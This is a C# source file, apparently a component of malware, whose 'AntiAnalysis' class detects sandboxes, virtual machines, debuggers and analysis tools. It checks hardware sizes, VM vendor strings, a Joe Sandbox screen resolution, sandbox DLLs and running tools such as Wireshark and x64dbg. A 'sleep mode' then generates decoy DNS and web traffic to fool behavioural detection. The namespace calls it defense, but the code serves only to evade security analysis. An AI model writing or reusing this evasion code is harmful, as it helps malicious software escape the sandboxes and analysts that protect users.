using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Management;

namespace VanguardCore.Defense
{
    public static class AntiAnalysis
    {
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        public static bool CheckAll()
        {
            // 1. CPU Core Count Check (Sandboxes < 2)
            if (Environment.ProcessorCount < 2) return true;

            // 2. RAM Check (Sandboxes < 3GB)
            try {
                long ramBytes = 0;
                using (var searcher = new ManagementObjectSearcher("Select TotalPhysicalMemory from Win32_ComputerSystem")) {
                    foreach (var item in searcher.Get()) {
                        ramBytes = Convert.ToInt64(item["TotalPhysicalMemory"]);
                        break;
                    }
                }
                if (ramBytes > 0 && ramBytes < 3L * 1024 * 1024 * 1024) return true;
            } catch { }

            // 3. Disk Size Check (Sandboxes < 60GB)
            try {
                string sysDrive = Path.GetPathRoot(Environment.SystemDirectory);
                DriveInfo drive = new DriveInfo(sysDrive);
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return true;
            } catch { }

            // 4. VM Hardware Check (Manufacturers)
            try {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem")) {
                    foreach (var item in searcher.Get()) {
                        string m = item["Manufacturer"].ToString().ToLower();
                        string mod = item["Model"].ToString().ToLower();
                        if (m.Contains("microsoft") && mod.Contains("virtual")) return true; // Hyper-V
                        if (m.Contains("vmware") || mod.Contains("vmware")) return true;
                        if (m.Contains("innotek") || mod.Contains("virtualbox")) return true;
                    }
                }
            } catch { }

            // 5. Resolution Check (Joe Sandbox: 1920x1017)
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            if (width == 1920 && height == 1017) return true;
            if (width < 800 || height < 600) return true;

            // 6. Blacklisted DLLs & Software
            string[] badDlls = { "SbieDll.dll", "api_log.dll", "dir_log.dll", "dbghelp.dll", "vmcheck.dll", "wship6.dll" };
            foreach (var dll in badDlls) if (GetModuleHandle(dll) != IntPtr.Zero) return true;

            // 7. Analysis Tool Check (Active Processes)
            string[] tools = { "wireshark", "x64dbg", "processhacker", "glasswire", "dnspy" };
            foreach (var tool in tools) if (Process.GetProcessesByName(tool).Length > 0) return true;

            // 8. API Latency Check
            long t1 = GetTickCount64();
            Thread.Sleep(10);
            long t2 = GetTickCount64();
            if (t2 - t1 > 500) return true;

            return false;
        }

        public static void EnterSleepMode()
        {
            // Silent loop with decoy activity to fool behavioral engines
            while (true)
            {
                try
                {
                    // Decoy DNS queries
                    Dns.GetHostEntry("microsoft.com");
                    Dns.GetHostEntry("windowsupdate.microsoft.com");
                    
                    // Decoy HTTP traffic
                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                        _ = client.GetStringAsync("https://www.bing.com").Result;
                    }
                }
                catch { }

                // Jittered sleep: 30-120 seconds
                Thread.Sleep(new Random().Next(30000, 120000));
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern long GetTickCount64();
    }
}
